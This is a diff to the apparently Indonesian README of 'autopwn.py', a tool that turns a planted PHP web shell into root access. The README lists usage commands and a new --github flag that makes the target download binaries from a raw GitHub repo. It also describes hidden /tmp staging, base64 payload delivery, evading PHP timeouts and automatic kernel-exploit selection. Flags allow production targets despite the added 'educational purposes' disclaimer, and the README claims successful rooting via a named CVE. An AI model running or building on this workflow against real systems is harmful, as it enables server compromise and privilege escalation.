@@ -142,6 +142,7 @@ yang mengeksekusi PoC hanya tool ini dan hanya terhadap target dari `--shell`.
 python3 autopwn.py --shell http://TARGET/uploads/shell.php   # full: scan→root
 python3 autopwn.py --shell URL --scan-only                   # scan + PLAN.md saja
 python3 autopwn.py --shell URL --allow-backported            # BP: checker-stage saja
+python3 autopwn.py --shell URL --github                      # biner dari GitHub (raw)
 python3 autopwn.py --selftest                                # gate offline
 ```
 
@@ -149,10 +150,12 @@ Alur per target:
 
 1. **probe** — id/kernel/os/python3 → pilih flavor (python3 ≥3.8 → bash4 → abort).
 2. **deploy** — scanner ke `/tmp/.ap<rand>/`; pengiriman tiga lapis:
-   (1) `--fetch-base URL` hosting eksternal; (2) default: HTTP server ephemeral di
-   mesin arsip (hanya file terpilih, mati setelah run) → target tarik via
-   `python3 urllib`; (3) fallback chunk base64 via `echo | base64 -d`. Semua
-   jalur verifikasi `md5sum`.
+   (1) `--fetch-base URL` hosting eksternal; `--github` = fetch langsung dari
+   repo GitHub (`raw.githubusercontent.com/{user}/{repo}/{branch}`, default
+   kevinpratama102/AutoRoot/main — butuh internet di target); (2) default:
+   HTTP server ephemeral di mesin arsip (hanya file terpilih, mati setelah run)
+   → target tarik via `python3 urllib`; (3) fallback chunk base64 via
+   `echo | base64 -d`. Semua jalur verifikasi `md5sum`.
 3. **scan** — backgrounded (`nohup` + poll `done.flag`, lolos `max_execution_time`
    PHP) → report ditarik (fast path <40 KB; else gzip+split 24K + filter junk).
 4. **select** — parity buildkit (has_poc, confidence, KEV→tier→score) + skip
@@ -166,8 +169,9 @@ Alur per target:
 Output per target di `autopwn-out/{host}-{ts}/`: `scan.json`, `PLAN.md`
 (constraint vs terpasang, repo, biner lokal), `run.log`, `events.json`.
 
-- **Khusus target terautorisasi** (lab sendiri/CTF/pentest berizin). Target
-  produksi: wajib `--production` + `--confirm-production` (banner risiko).
+- **FOR EDUCATIONAL PURPOSES ONLY** — khusus target terautorisasi (lab
+  sendiri/CTF/pentest berizin). Target produksi: wajib `--production` +
+  `--confirm-production` (banner risiko).
 - Eksploit kernel bisa crash box lab — mitigasi: checker-first, stop-at-first-root.
 - Terbukti E2E (2026-09-28, lab 192.168.1.x): kedua box Ubuntu 24.04 di-root
   via CVE-2026-31431 CopyFail (checker VULNERABLE → patch su → `uid=0`); run
